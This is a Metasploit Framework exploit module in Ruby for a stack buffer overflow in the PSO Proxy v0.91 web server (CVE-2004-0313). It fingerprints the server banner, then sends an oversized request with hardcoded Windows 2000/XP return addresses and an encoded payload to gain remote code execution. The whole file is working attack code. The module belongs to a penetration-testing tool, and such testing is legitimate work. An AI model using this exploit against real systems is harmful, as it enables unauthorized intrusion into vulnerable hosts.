##
# $Id: psoproxy91_overflow.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'PSO Proxy v0.91 Stack Buffer Overflow\',
			\'Description\'    => %q{
				This module exploits a buffer overflow in the PSO Proxy v0.91 web server.
				If a client sends an excessively long string the stack is overwritten.
			},
			\'Author\'         => \'Patrick Webster <patrick@aushack.com>\',
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 9262 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2004-0313\' ],
					[ \'OSVDB\', \'4028\' ],
					[ \'URL\', \'http://www.milw0rm.com/exploits/156\' ],
					[ \'BID\', \'9706\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'thread\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 370,
					\'BadChars\' => \"\\x00\\x0a\\x0d\\x20\",
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
				# Patrick - Tested OK 2007/09/06 against w2ksp0, w2ksp4, xpsp0,xpsp2 en.
					[ \'Windows 2000 Pro SP0-4 English\',  { \'Ret\' => 0x75023112 } ], # call ecx ws2help.dll
					[ \'Windows 2000 Pro SP0-4 French\',   { \'Ret\' => 0x74fa3112 } ], # call ecx ws2help.dll
					[ \'Windows 2000 Pro SP0-4 Italian\',  { \'Ret\' => 0x74fd3112 } ], # call ecx ws2help.dll
					[ \'Windows XP Pro SP0/1 English\',    { \'Ret\' => 0x71aa396d } ], # call ecx ws2help.dll
					[ \'Windows XP Pro SP2 English\',	     { \'Ret\' => 0x71aa3de3 } ], # call ecx ws2help.dll
				],
			\'Privileged\'     => false,
			\'DisclosureDate\' => \'Feb 20 2004\'
			))

		register_options(
			[
				Opt::RPORT(8080),
			], self.class)
	end

	def check
		connect
		sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")
		banner = sock.get(-1,3)
		if (banner =~ /PSO Proxy 0\\.9/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		exploit = rand_text_alphanumeric(1024, payload_badchars)
		exploit += [target[\'Ret\']].pack(\'V\') + payload.encoded

		sock.put(exploit + \"\\r\\n\\r\\n\")

		disconnect
		handler
	end
end

